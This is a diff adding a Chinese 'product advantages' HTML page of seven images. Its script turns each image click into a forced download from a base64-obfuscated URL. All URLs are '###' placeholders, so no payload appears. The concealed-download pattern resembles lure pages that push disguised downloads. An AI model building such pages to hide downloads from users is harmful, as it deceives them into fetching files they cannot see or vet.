@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>产品优势</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+        }
+        img {
+            width: 100%;
+            height: auto;
+            display: block;
+            cursor: pointer; 
+        }
+    </style>
+</head>
+<body>
+
+   <img src="static/picture/d_01.jpg"  >
+    <img src="static/picture/d_02.jpg"  >
+    <img src="static/picture/d_03.jpg" >
+	<img src="static/picture/d_04.jpg"  >
+	<img src="static/picture/d_05.jpg"  >
+	 <img src="static/picture/d_06.jpg"  >
+	 <img src="static/picture/d_07.jpg"  >
+
+<script>
+        
+        const encryptedUrls = [
+            '###',
+            '###',
+            '###',
+            '###',
+            '###',
+            '###',
+            '###'
+        ];
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+        
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
+        });
+    </script>  
+    
+
+</body>
+</html>
